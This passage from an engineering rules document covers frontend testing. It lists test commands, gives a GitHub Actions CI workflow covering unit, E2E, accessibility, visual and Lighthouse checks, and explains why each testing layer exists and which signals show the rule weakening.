# Unit + component tests
pnpm vitest --coverage          # Vitest + V8 coverage
pnpm jest --coverage             # Jest fallback

# Accessibility
pnpm test:a11y                   # jest-axe + custom
pnpm exec axe-core http://localhost:3000

# E2E
pnpm playwright test
pnpm cypress run                 # Cypress fallback

# Visual regression
pnpm chromatic
pnpm exec percy snapshot ./snapshots

# Performance
pnpm exec lhci autorun

# Bundle size
pnpm size-limit

# Mutation
pnpm exec stryker run

# Cross-browser via real-device
pnpm exec playwright test --project=safari-iphone
```

## CI workflow shape

```yaml
# .github/workflows/frontend-ci.yml
---
name: Frontend CI

on: pull_request

jobs:
  unit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: pnpm/action-setup@<sha>
      - run: pnpm install --frozen-lockfile
      - run: pnpm vitest --coverage
      - uses: codecov/codecov-action@<sha>

  e2e:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        project: [chromium, firefox, webkit]
    steps:
      - uses: actions/checkout@<sha>
      - uses: pnpm/action-setup@<sha>
      - run: pnpm install --frozen-lockfile
      - run: pnpm exec playwright install --with-deps ${{ matrix.project }}
      - run: pnpm exec playwright test --project=${{ matrix.project }}

  a11y:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: pnpm/action-setup@<sha>
      - run: pnpm install --frozen-lockfile
      - run: pnpm test:a11y

  visual:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: pnpm/action-setup@<sha>
      - run: pnpm install --frozen-lockfile
      - run: pnpm chromatic --exit-zero-on-changes  # or Percy

  lighthouse:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<sha>
      - uses: pnpm/action-setup@<sha>
      - run: pnpm install --frozen-lockfile
      - run: pnpm build
      - run: pnpm exec lhci autorun
```

## Cross-references

- [`html-css/coding-style.md`](../../rules-library/html-css/coding-style.md) — semantic
  HTML is testable
- [`html-css/patterns.md`](../../rules-library/html-css/patterns.md) — accessible
  components are testable
- [`html-css/security.md`](../../rules-library/html-css/security.md) — XSS-resistant
  rendering is testable (snapshot of escaped output)
- [`html-css/hooks.md`](../../rules-library/html-css/hooks.md) — lint + format + axe gates
- [`common/testing.md`](../../rules-library/common/testing.md) — broader test
  strategy
- [`common/a11y.md`](../../rules-library/common/a11y.md) — WCAG 2.2 AA = test
  gate
- [`common/error-codes.md`](../../rules-library/common/error-codes.md) — assert
  on codes, not copy
- [`common/extreme-lint-policy.md`](../../rules-library/common/extreme-lint-policy.md)
  — coverage floor 90% touched / 80% project
- [`common/local-dev-setup.md`](../../rules-library/common/local-dev-setup.md)
  — same script runs locally + CI

## Why this rule exists

Frontend bugs differ from backend bugs in one critical way:
users see them. A backend bug fires a metric; a frontend bug
breaks the conversion funnel. The testing layers above each
catch a class:

- **Unit + Testing Library** — catches logic regressions
- **axe-core** — catches accessibility regressions (which are
  also legal exposure per [`common/a11y.md`](../../rules-library/common/a11y.md))
- **Visual regression** — catches CSS / design-system drift
  (the "we changed a token, what broke?" question)
- **E2E** — catches the journey-level break (everything works
  in isolation but the wire-up is wrong)
- **Lighthouse / Core Web Vitals** — catches perf regressions
  before they reach the SEO / conversion metrics
- **Bundle-size** — catches dep-bloat creep
- **Mutation** — catches tests that look comprehensive but
  don't actually exercise the assertion

No single layer is sufficient; together they form the gate.

## Learning hooks

Per [`common/continuous-learning-mandate.md`](../../rules/common/continuous-learning-mandate.md):

**Signals to watch**:

- Component shipped without a Testing Library test (rule 1
  weakening)
- Keyboard test absent on a new interactive component (rule 2
  weakening — sister `common/a11y.md`)
- Error / empty / loading state untested for a new feature
  (rule 3 weakening)
- axe-core not invoked at either unit or E2E layer for a new
  page (rule 4 violation)
- Visual regression story not added for a new component
  (rule 5 weakening)
- E2E coverage missing on a critical user journey (rule 6
  weakening)
- Cross-browser matrix dropped to chromium-only (rule 7 — single
  engine bias)
- Lighthouse CI score regresses past the threshold without
  rollback (rule 8 weakening)
- Bundle size grows past the budget without justification
  (rule 9 weakening)
- `waitForTimeout` introduced to mask flake (Anti-pattern 4)
- Snapshot tests dominating UI suite (Anti-pattern 1 drift)

**Refinement candidates**:

- New layer row when a new testing tool (Storybook test runner,
  Vitest browser mode, real-browser axe runner) gains team
  adoption
- Tightening of the Lighthouse threshold when product hits
  consistent green scores
- New cross-reference when a sister rule (a11y, i18n,
  frontend-patterns skill) prescribes a test contract
- New anti-pattern entry when a recurring flake / false-pass
  shape emerges

---
